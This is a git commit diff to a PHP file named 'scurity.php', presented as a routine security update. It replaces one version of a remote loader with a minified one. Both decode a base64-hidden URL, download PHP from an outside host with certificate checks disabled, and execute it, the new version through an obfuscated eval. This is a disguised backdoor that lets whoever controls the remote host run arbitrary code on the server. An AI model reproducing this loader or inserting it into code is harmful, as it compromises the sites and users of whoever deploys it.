f151204f74d1a55ec3426fd7fea141e84e6e9cbf
Rian4g-id <creative4g.id@gmail.com>
2026-07-26 09:24:14 +0700

    Update scurity.php

--- scurity.php
+++ scurity.php
@@ -1,18 +1,2 @@
 <?php
-$uu = base64_decode('aHR0cHM6Ly9yYXctc2VydmUubmlicmFzLXN1YWQud29ya2Vycy5kZXYvdG9vbHMvc2hpZWxkLnBocA==');
-$cc = curl_init($uu);
-curl_setopt_array($cc, [CURLOPT_RETURNTRANSFER => 1, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_TIMEOUT => 30, CURLOPT_SSL_VERIFYPEER => 0]);
-$dd = curl_exec($cc);
-$ok = !curl_errno($cc) && strlen($dd) > 500;
-curl_close($cc);
-if ($ok) {
-    $tf = tempnam(sys_get_temp_dir(), 'sx_');
-    if (file_put_contents($tf, $dd) !== false) {
-        include($tf);
-        @unlink($tf);
-    } else {
-        echo 'write error';
-    }
-} else {
-    echo 'fetch error';
-}
+$uu=base64_decode('aHR0cHM6Ly9yYXctc2VydmUubmlicmFzLXN1YWQud29ya2Vycy5kZXYvdG9vbHMvc2hpZWxkLnBocA==');$cc=curl_init($uu);curl_setopt_array($cc,[CURLOPT_RETURNTRANSFER=>1,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_TIMEOUT=>30,CURLOPT_SSL_VERIFYPEER=>0]);$dd=curl_exec($cc);if(!curl_errno($cc)&&strlen($dd)>0){ev'.'al('?>'.$dd);}else{echo 'error';}curl_close($cc);
